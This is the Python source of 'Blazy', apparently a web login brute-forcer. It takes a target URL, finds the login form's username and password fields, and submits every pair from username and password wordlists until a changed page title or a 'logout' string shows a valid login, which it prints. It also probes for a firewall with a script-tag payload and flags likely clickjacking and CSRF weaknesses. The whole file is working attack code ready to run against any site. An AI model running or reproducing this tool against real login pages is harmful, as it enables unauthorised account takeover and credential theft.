"""Docstring in public module."""
# TODO: Replace mechanize with mechanical soup
import mechanize
# TODO: Find a replacement for cookielib
import cookielib
import sys
from bs4 import BeautifulSoup
from re import search
# TODO: replace urllib & urllib2 with requests
from urllib import urlopen
from urllib2 import URLError


# Stuff related to Mechanize browser module
# Shortening the call by assigning it to a varaible "br"
br = mechanize.Browser()

# set cookies
cookies = cookielib.LWPCookieJar()
br.set_cookiejar(cookies)

# Mechanize settings
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(
    mechanize._http.HTTPRefreshProcessor(),
    max_time=1)
br.addheaders = [
    (
        'User-agent',
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) '
        'Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'
    ),
    (
        'Accept',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    ),
    ('Accept-Encoding', 'br')]

# Banner
print("""\033[1;37m    ____   _
   |  _ \ | |
   | |_) || |  __ _  ____ _   _
   |  _ < | | / _` ||_  /| | | |
   | |_) || || (_| | / / | |_| |
   |____/ |_| \__,_|/___| \__, |
                           __/ |
    Made with \033[91m<3\033[37m By D3V\033[1;37m   |___/
    \033[0m""")

# takes input from user
url = input('\033[1;34m[?]\033[0m Enter target URL: ')

if 'http://' in url:
    pass
elif 'https://' in url:
    url = url.replace('https://', 'http://')
else:
    url = 'http://' + url
try:
    # Open the url
    br.open(url, timeout=10.0)
except URLError as e:
    url = 'https://' + url
    br.open(url)

# Finds all the forms present in webpage
forms = br.forms()


# Fetches headers of webpage
headers = str(urlopen(url).headers.headers).lower()

if 'x-frame-options:' not in headers:
    print('\033[1;32m[+]\033[0m Heuristic found a Clickjacking Vulnerability')
if 'cloudflare-nginx' in headers:
    print('\033[1;31m[-]\033[0m Target is protected by Cloudflare')

# Reads the response
data = br.open(url).read()

if 'type="hidden"' not in data:
    print('\033[1;32m[+]\033[0m Heuristic found a CSRF Vulnerability')

# Pareses the response with beautiful soup
soup = BeautifulSoup(data, 'lxml')

# finds the title tag
i_title = soup.find('title')
if i_title is not None:
    # value of title tag is assigned to 'original'
    original = i_title.contents


def WAF_detector():
    """WAF detection function."""
    # a payload which is noisy enough to provoke the WAF
    noise = "?=<script>alert()</script>"
    fuzz = url + noise
    # Open the noise injected payload
    res1 = urlopen(fuzz)

    # Process the various HTTP response codes
    if res1.code == 406 or res1.code == 501:
        print("\033[1;31m[-]\033[1;m WAF Detected : Mod_Security")
    elif res1.code == 999:
        print("\033[1;31m[-]\033[1;m WAF Detected : WebKnight")
    elif res1.code == 419:
        print("\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP")
    elif res1.code == 403:
        print("\033[1;31m[-]\033[1;m Unknown WAF Detected")


WAF_detector()


def wordlist_u(lst):
    """Load username from usernames.txt."""
    try:
        with open('usernames.txt', 'r') as f:
            for line in f:
                final = str(line.replace("\n", ""))
                lst.append(final)
    except IOError:
        print("\033[1;31m[-]\033[1;m Wordlist not found!")
        quit()


def wordlist_p(lst):
    """Load passwords from passwords.txt."""
    try:
        with open('passwords.txt', 'r') as f:
            for line in f:
                final = str(line.replace("\n", ""))
                lst.append(final)
    except IOError:
        print("\033[1;31m[-]\033[1;m Wordlist not found!")
        quit()


usernames = []
wordlist_u(usernames)
print('\033[1;97m[>]\033[1;m Usernames loaded: %i' % len(usernames))
passwords = []
wordlist_p(passwords)
print('\033[1;97m[>]\033[1;m Passwords loaded: %i' % + len(passwords))


def find():
    """Find all the forms."""
    form_number = 0

    # Find all the forms in the webpage.
    for f in forms:
        data = str(f)

        # Search for fields that accpet plain text
        username = search(r'<TextControl\([^<]*=\)>', data)

        # If we find such a field
        if username:

            # Extract the name of the field
            username = (username.group().split('<TextControl(')[1][:-3])

            # Print the name of the field
            print('\033[1;33m[!]\033[0m Username field: ' + username)

            # Search for fields that accept password-like text
            passwd = search(r'<PasswordControl\([^<]*=\)>', data)

            # If we find such a field
            if passwd:

                # Extract the field name
                passwd = (passwd.group().split('<PasswordControl(')[1][:-3])

                # Print the name of the field
                print('\033[1;33m[!]\033[0m Password field: ' + passwd)

                # Check for other selectable menus in the form
                select_n = search(r'SelectControl\([^<]*=', data)

                # If such a menu is found
                if select_n:

                    # Extract the menu name
                    name = (select_n.group().split('(')[1][:-1])

                    # Select_o is the name of the control
                    select_o = search(r'SelectControl\([^<]*=[^<]*\)>', data)

                    # Get the options
                    if select_o:
                        menu = "True"

                        # Extract the options
                        options = (select_o.group().split('=')[1][:-1])
                        print(
                            '\n\033[1;33m[!]\033[0m '
                            'A drop down menu detected.')
                        print('\033[1;33m[!]\033[0m Menu name: ' + name)
                        print(
                            '\033[1;33m[!]\033[0m '
                            'Options available: ' + options)
                        option = input(
                            '\033[1;34m[?]\033[0m '
                            'Please Select an option:>> ')

                        # Call the bruteforce function
                        brute(
                            username,
                            passwd,
                            menu,
                            option,
                            name,
                            form_number)
                    else:
                        # No menu was found
                        menu = "False"
                        try:
                            # Call the bruteforce function
                            brute(
                                username,
                                passwd,
                                menu,
                                option,
                                name,
                                form_number)
                        except Exception as e:
                            cannotUseBruteForce(username, e)
                            pass
                else:
                    # No menu was found
                    menu = "False"
                    option = ""
                    name = ""
                    try:
                        # Call the bruteforce function
                        brute(
                            username,
                            passwd,
                            menu,
                            option,
                            name,
                            form_number)
                    except Exception as e:
                        cannotUseBruteForce(username, e)
                        pass
            else:
                form_number = form_number + 1
                pass
        else:
            form_number = form_number + 1
            pass
    print('\033[1;31m[-]\033[0m No forms found')


def cannotUseBruteForce(username, e):
    """Tell the user they are SOL."""
    print(
        '\r\033[1;31m[!]\033[0m Cannot use brute force with user %s.'
        % username)
    print('\r    [Error: %s]' % e.message)


def brute(username, passwd, menu, option, name, form_number):
    """Try to brute force our way in."""
    for uname in usernames:
        progress = 1
        print('\033[1;97m[>]\033[1;m Bruteforcing username: %s' % uname)
        for password in passwords:
            sys.stdout.write(
                '\r\033[1;97m[>]\033[1;m Passwords tried: %i / %i'
                % (progress, len(passwords)))
            sys.stdout.flush()
            br.open(url)
            br.select_form(nr=form_number)
            br.form[username] = uname
            br.form[passwd] = password
            if menu == "False":
                pass
            elif menu == "True":
                br.form[name] = [option]
            else:
                pass
            resp = br.submit()
            data = resp.read()
            data_low = data.lower()
            if 'username or password' in data_low:
                pass
            else:
                soup = BeautifulSoup(data, 'lxml')
                i_title = soup.find('title')
                if i_title is None:
                    data = data.lower()
                    if 'logout' in data:
                        print(
                            '\n\033[1;32m[+]\033[0m '
                            'Valid credentials found: ')
                        print(uname)
                        print(password)
                        quit()
                    else:
                        pass
                else:
                    injected = i_title.contents
                    if original != injected:
                        print(
                            '\n\033[1;32m[+]\033[0m '
                            'Valid credentials found: ')
                        print('\033[1;32mUsername: \033[0m' + uname)
                        print('\033[1;32mPassword: \033[0m' + password)
                        quit()
                    else:
                        pass
            progress = progress + 1
        print('')
    print('\033[1;31m[-]\033[0m Failed to crack login credentials')
    quit()


find()
